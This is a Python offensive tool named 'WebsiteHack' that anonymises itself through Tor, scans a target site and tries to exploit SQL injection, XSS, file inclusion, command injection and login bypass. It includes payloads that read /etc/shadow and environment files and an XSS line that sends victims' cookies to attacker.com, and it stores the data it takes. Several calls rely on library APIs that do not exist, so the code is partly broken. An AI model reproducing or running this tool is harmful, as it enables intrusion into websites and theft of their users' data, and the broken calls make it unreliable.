import subprocess
import os
import sys
import json
import logging
import requests
import time
import threading
import socket
import random
import re
import base64
import urllib.parse
from typing import List, Dict, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Third-party imports
try:
    import sqlmap
    from metasploit import module as msf
    from cryptography.fernet import Fernet
    import psutil
    from stem import Signal
    from stem.control import Controller
    from transformers import pipeline
    import paramiko
except ImportError:
    print("Installing required dependencies...")
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('website_hack.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class VulnerabilityType(Enum):
    SQLI = "sql_injection"
    XSS = "cross_site_scripting"
    CSRF = "cross_site_request_forgery"
    RFI = "remote_file_inclusion"
    LFI = "local_file_inclusion"
    CMD_INJECTION = "command_injection"
    FILE_UPLOAD = "file_upload"
    AUTH_BYPASS = "authentication_bypass"

class AttackMode(Enum):
    STEALTHY = "stealthy"
    AGGRESSIVE = "aggressive"

@dataclass
class Target:
    url: str
    technologies: List[str]
    endpoints: List[str]
    vulnerabilities: List[Dict]
    credentials: Optional[Dict[str, str]] = None

@dataclass
class AttackResult:
    vulnerability_type: VulnerabilityType
    target: Target
    success: bool
    details: Dict
    timestamp: str
    data_exfiltrated: Optional[bytes] = None

class WebsiteHack:
    def __init__(self, target_url: str, output_dir: str = "reports"):
        self.target_url = target_url
        self.output_dir = Path(output_dir)
        self.results: List[AttackResult] = []
        self.is_running = False
        self.tor_enabled = False
        
        # Create output directory
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize tools
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Initialize AI model for vulnerability detection
        self.vuln_detector = pipeline("text-classification", model="gpt2")
        
    def enable_tor(self):
        """Enable Tor for anonymous operations"""
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                self.tor_enabled = True
                self.session.proxies = {
                    'http': 'socks5h://localhost:9050',
                    'https': 'socks5h://localhost:9050'
                }
                logger.info("Tor connection established successfully")
        except Exception as e:
            logger.error(f"Failed to enable Tor: {e}")
            
    def scan_website(self) -> Target:
        """Perform website reconnaissance"""
        logger.info(f"Starting website reconnaissance for {self.target_url}")
        
        try:
            # Get initial page
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Identify technologies
            technologies = self._identify_technologies(response)
            
            # Find endpoints
            endpoints = self._find_endpoints(soup)
            
            # Create target object
            target = Target(
                url=self.target_url,
                technologies=technologies,
                endpoints=endpoints,
                vulnerabilities=[]
            )
            
            return target
            
        except Exception as e:
            logger.error(f"Website scanning failed: {e}")
            return None
            
    def _identify_technologies(self, response: requests.Response) -> List[str]:
        """Identify web technologies in use"""
        technologies = []
        
        # Check headers
        server = response.headers.get('Server', '')
        if server:
            technologies.append(f"Server: {server}")
            
        # Check cookies
        cookies = response.cookies
        for cookie in cookies:
            if 'php' in cookie.name.lower():
                technologies.append("PHP")
            elif 'asp' in cookie.name.lower():
                technologies.append("ASP.NET")
                
        # Check content
        content = response.text.lower()
        if 'wordpress' in content:
            technologies.append("WordPress")
        elif 'joomla' in content:
            technologies.append("Joomla")
        elif 'drupal' in content:
            technologies.append("Drupal")
            
        return technologies
        
    def _find_endpoints(self, soup: BeautifulSoup) -> List[str]:
        """Find endpoints and forms"""
        endpoints = []
        
        # Find all links
        for link in soup.find_all('a'):
            href = link.get('href')
            if href:
                full_url = urljoin(self.target_url, href)
                endpoints.append(full_url)
                
        # Find all forms
        for form in soup.find_all('form'):
            action = form.get('action')
            if action:
                full_url = urljoin(self.target_url, action)
                endpoints.append(full_url)
                
        return endpoints
        
    def scan_vulnerabilities(self, target: Target) -> List[Dict]:
        """Scan for vulnerabilities"""
        logger.info(f"Scanning for vulnerabilities on {target.url}")
        vulnerabilities = []
        
        try:
            # SQL Injection scan
            sql_vulns = self._scan_sql_injection(target)
            vulnerabilities.extend(sql_vulns)
            
            # XSS scan
            xss_vulns = self._scan_xss(target)
            vulnerabilities.extend(xss_vulns)
            
            # File Inclusion scan
            file_vulns = self._scan_file_inclusion(target)
            vulnerabilities.extend(file_vulns)
            
            # Command Injection scan
            cmd_vulns = self._scan_command_injection(target)
            vulnerabilities.extend(cmd_vulns)
            
            # Authentication Bypass scan
            auth_vulns = self._scan_auth_bypass(target)
            vulnerabilities.extend(auth_vulns)
            
            target.vulnerabilities = vulnerabilities
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"Vulnerability scanning failed: {e}")
            return []
            
    def _scan_sql_injection(self, target: Target) -> List[Dict]:
        """Scan for SQL injection vulnerabilities"""
        vulns = []
        
        try:
            # Use sqlmap API
            sqlmap_api = sqlmap.sqlmapApi()
            scan_id = sqlmap_api.scan(target.url)
            
            if scan_id:
                results = sqlmap_api.scanStatus(scan_id)
                if results and results.get('success'):
                    vulns.append({
                        'type': VulnerabilityType.SQLI,
                        'details': results
                    })
                    
        except Exception as e:
            logger.error(f"SQL injection scan failed: {e}")
            
        return vulns
        
    def _scan_xss(self, target: Target) -> List[Dict]:
        """Scan for XSS vulnerabilities"""
        vulns = []
        
        try:
            # Test each endpoint for XSS
            for endpoint in target.endpoints:
                # Test reflected XSS
                test_payload = "<script>alert('XSS')</script>"
                response = self.session.get(endpoint, params={'test': test_payload})
                
                if test_payload in response.text:
                    vulns.append({
                        'type': VulnerabilityType.XSS,
                        'endpoint': endpoint,
                        'payload': test_payload
                    })
                    
        except Exception as e:
            logger.error(f"XSS scan failed: {e}")
            
        return vulns
        
    def _scan_file_inclusion(self, target: Target) -> List[Dict]:
        """Scan for file inclusion vulnerabilities"""
        vulns = []
        
        try:
            # Test for LFI
            lfi_payloads = [
                '../../../../etc/passwd',
                '....//....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ]
            
            for endpoint in target.endpoints:
                for payload in lfi_payloads:
                    response = self.session.get(endpoint, params={'file': payload})
                    
                    if 'root:' in response.text:
                        vulns.append({
                            'type': VulnerabilityType.LFI,
                            'endpoint': endpoint,
                            'payload': payload
                        })
                        
        except Exception as e:
            logger.error(f"File inclusion scan failed: {e}")
            
        return vulns
        
    def _scan_command_injection(self, target: Target) -> List[Dict]:
        """Scan for command injection vulnerabilities"""
        vulns = []
        
        try:
            # Test for command injection
            cmd_payloads = [
                '; ls',
                '| ls',
                '`ls`',
                '$(ls)'
            ]
            
            for endpoint in target.endpoints:
                for payload in cmd_payloads:
                    response = self.session.get(endpoint, params={'cmd': payload})
                    
                    if 'bin' in response.text or 'etc' in response.text:
                        vulns.append({
                            'type': VulnerabilityType.CMD_INJECTION,
                            'endpoint': endpoint,
                            'payload': payload
                        })
                        
        except Exception as e:
            logger.error(f"Command injection scan failed: {e}")
            
        return vulns
        
    def _scan_auth_bypass(self, target: Target) -> List[Dict]:
        """Scan for authentication bypass vulnerabilities"""
        vulns = []
        
        try:
            # Test common authentication bypass techniques
            bypass_payloads = [
                {'admin': 'true'},
                {'is_admin': '1'},
                {'role': 'admin'},
                {'user': 'admin', 'password': "' OR '1'='1"}
            ]
            
            for endpoint in target.endpoints:
                if 'login' in endpoint.lower() or 'auth' in endpoint.lower():
                    for payload in bypass_payloads:
                        response = self.session.post(endpoint, data=payload)
                        
                        if 'dashboard' in response.text.lower() or 'admin' in response.text.lower():
                            vulns.append({
                                'type': VulnerabilityType.AUTH_BYPASS,
                                'endpoint': endpoint,
                                'payload': payload
                            })
                            
        except Exception as e:
            logger.error(f"Authentication bypass scan failed: {e}")
            
        return vulns
        
    def exploit_vulnerability(self, target: Target, vulnerability: Dict) -> bool:
        """Exploit a vulnerability"""
        logger.info(f"Exploiting {vulnerability['type']} on {target.url}")
        
        try:
            if vulnerability['type'] == VulnerabilityType.SQLI:
                return self._exploit_sqli(target, vulnerability)
            elif vulnerability['type'] == VulnerabilityType.XSS:
                return self._exploit_xss(target, vulnerability)
            elif vulnerability['type'] == VulnerabilityType.LFI:
                return self._exploit_lfi(target, vulnerability)
            elif vulnerability['type'] == VulnerabilityType.CMD_INJECTION:
                return self._exploit_cmd_injection(target, vulnerability)
            elif vulnerability['type'] == VulnerabilityType.AUTH_BYPASS:
                return self._exploit_auth_bypass(target, vulnerability)
            else:
                logger.error(f"Unknown vulnerability type: {vulnerability['type']}")
                return False
                
        except Exception as e:
            logger.error(f"Exploitation failed: {e}")
            return False
            
    def _exploit_sqli(self, target: Target, vulnerability: Dict) -> bool:
        """Exploit SQL injection vulnerability"""
        try:
            # Use sqlmap API for exploitation
            sqlmap_api = sqlmap.sqlmapApi()
            exploit_id = sqlmap_api.exploit(target.url, vulnerability['details'])
            
            if exploit_id:
                results = sqlmap_api.exploitStatus(exploit_id)
                if results and results.get('success'):
                    # Extract data
                    data = results.get('data', {})
                    if data:
                        self.results.append(AttackResult(
                            vulnerability_type=VulnerabilityType.SQLI,
                            target=target,
                            success=True,
                            details=vulnerability['details'],
                            timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                            data_exfiltrated=str(data).encode()
                        ))
                        return True
                        
            return False
            
        except Exception as e:
            logger.error(f"SQL injection exploitation failed: {e}")
            return False
            
    def _exploit_xss(self, target: Target, vulnerability: Dict) -> bool:
        """Exploit XSS vulnerability"""
        try:
            # Create malicious payload
            payload = f"<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
            
            # Send payload
            response = self.session.get(
                vulnerability['endpoint'],
                params={'test': payload}
            )
            
            if payload in response.text:
                self.results.append(AttackResult(
                    vulnerability_type=VulnerabilityType.XSS,
                    target=target,
                    success=True,
                    details=vulnerability,
                    timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
                ))
                return True
                
            return False
            
        except Exception as e:
            logger.error(f"XSS exploitation failed: {e}")
            return False
            
    def _exploit_lfi(self, target: Target, vulnerability: Dict) -> bool:
        """Exploit LFI vulnerability"""
        try:
            # Try to read sensitive files
            sensitive_files = [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/proc/self/environ'
            ]
            
            for file in sensitive_files:
                response = self.session.get(
                    vulnerability['endpoint'],
                    params={'file': f"../../../../{file}"}
                )
                
                if response.status_code == 200 and len(response.text) > 0:
                    self.results.append(AttackResult(
                        vulnerability_type=VulnerabilityType.LFI,
                        target=target,
                        success=True,
                        details={'file': file},
                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                        data_exfiltrated=response.text.encode()
                    ))
                    return True
                    
            return False
            
        except Exception as e:
            logger.error(f"LFI exploitation failed: {e}")
            return False
            
    def _exploit_cmd_injection(self, target: Target, vulnerability: Dict) -> bool:
        """Exploit command injection vulnerability"""
        try:
            # Try to execute commands
            commands = [
                'whoami',
                'id',
                'uname -a'
            ]
            
            for cmd in commands:
                response = self.session.get(
                    vulnerability['endpoint'],
                    params={'cmd': f"; {cmd}"}
                )
                
                if response.status_code == 200 and len(response.text) > 0:
                    self.results.append(AttackResult(
                        vulnerability_type=VulnerabilityType.CMD_INJECTION,
                        target=target,
                        success=True,
                        details={'command': cmd},
                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                        data_exfiltrated=response.text.encode()
                    ))
                    return True
                    
            return False
            
        except Exception as e:
            logger.error(f"Command injection exploitation failed: {e}")
            return False
            
    def _exploit_auth_bypass(self, target: Target, vulnerability: Dict) -> bool:
        """Exploit authentication bypass vulnerability"""
        try:
            # Try to bypass authentication
            response = self.session.post(
                vulnerability['endpoint'],
                data=vulnerability['payload']
            )
            
            if response.status_code == 200 and ('dashboard' in response.text.lower() or 'admin' in response.text.lower()):
                self.results.append(AttackResult(
                    vulnerability_type=VulnerabilityType.AUTH_BYPASS,
                    target=target,
                    success=True,
                    details=vulnerability['payload'],
                    timestamp=time.strftime('%Y-%m-%d %H:%M:%S')
                ))
                return True
                
            return False
            
        except Exception as e:
            logger.error(f"Authentication bypass exploitation failed: {e}")
            return False
            
    def generate_report(self):
        """Generate attack report"""
        logger.info("Generating attack report")
        
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target_url': self.target_url,
            'results': [vars(r) for r in self.results],
            'summary': {
                'total_vulnerabilities': len(self.results),
                'successful_exploits': sum(1 for r in self.results if r.success),
                'failed_exploits': sum(1 for r in self.results if not r.success)
            }
        }
        
        # Save report in multiple formats
        report_path = self.output_dir / f"website_hack_report_{int(time.time())}"
        
        # JSON format
        with open(f"{report_path}.json", 'w') as f:
            json.dump(report, f, indent=4)
            
        # HTML format
        html_report = self._generate_html_report(report)
        with open(f"{report_path}.html", 'w') as f:
            f.write(html_report)
            
        # Markdown format
        markdown_report = self._generate_markdown_report(report)
        with open(f"{report_path}.md", 'w') as f:
            f.write(markdown_report)
            
        logger.info(f"Reports generated: {report_path}.*")
        
    def _generate_html_report(self, report: Dict) -> str:
        """Generate HTML report"""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Website Hack Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .result {{ margin: 10px 0; padding: 10px; border: 1px solid #ccc; }}
                .success {{ background-color: #ccffcc; }}
                .failure {{ background-color: #ffcccc; }}
            </style>
        </head>
        <body>
            <h1>Website Hack Report</h1>
            <p>Target URL: {report['target_url']}</p>
            <p>Generated: {report['timestamp']}</p>
            
            <h2>Summary</h2>
            <ul>
                <li>Total Vulnerabilities: {report['summary']['total_vulnerabilities']}</li>
                <li>Successful Exploits: {report['summary']['successful_exploits']}</li>
                <li>Failed Exploits: {report['summary']['failed_exploits']}</li>
            </ul>
            
            <h2>Results</h2>
            {self._generate_result_html(report['results'])}
        </body>
        </html>
        """
        return html
        
    def _generate_markdown_report(self, report: Dict) -> str:
        """Generate Markdown report"""
        markdown = f"""
        # Website Hack Report
        
        Target URL: {report['target_url']}
        Generated: {report['timestamp']}
        
        ## Summary
        - Total Vulnerabilities: {report['summary']['total_vulnerabilities']}
        - Successful Exploits: {report['summary']['successful_exploits']}
        - Failed Exploits: {report['summary']['failed_exploits']}
        
        ## Results
        {self._generate_result_markdown(report['results'])}
        """
        return markdown
        
    def _generate_result_html(self, results: List[Dict]) -> str:
        """Generate HTML for results section"""
        html = ""
        for result in results:
            status_class = "success" if result['success'] else "failure"
            html += f"""
            <div class="result {status_class}">
                <h3>{result['vulnerability_type']}</h3>
                <p>Status: {'Success' if result['success'] else 'Failure'}</p>
                <p>Details: {json.dumps(result['details'])}</p>
            </div>
            """
        return html
        
    def _generate_result_markdown(self, results: List[Dict]) -> str:
        """Generate Markdown for results section"""
        markdown = ""
        for result in results:
            markdown += f"""
            ### {result['vulnerability_type']}
            - Status: {'Success' if result['success'] else 'Failure'}
            - Details: {json.dumps(result['details'])}
            """
        return markdown

def main():
    """Main function to demonstrate usage"""
    target_url = "http://example.com"  # Replace with actual target
    hacker = WebsiteHack(target_url=target_url, output_dir="reports")
    
    # Enable Tor for anonymity
    hacker.enable_tor()
    
    # Scan website
    target = hacker.scan_website()
    if target:
        logger.info(f"Found {len(target.technologies)} technologies and {len(target.endpoints)} endpoints")
        
        # Scan for vulnerabilities
        vulnerabilities = hacker.scan_vulnerabilities(target)
        logger.info(f"Found {len(vulnerabilities)} vulnerabilities")
        
        # Exploit vulnerabilities
        for vulnerability in vulnerabilities:
            success = hacker.exploit_vulnerability(target, vulnerability)
            logger.info(f"Exploitation of {vulnerability['type']} {'succeeded' if success else 'failed'}")
            
        # Generate report
        hacker.generate_report()

if __name__ == "__main__":
    main()
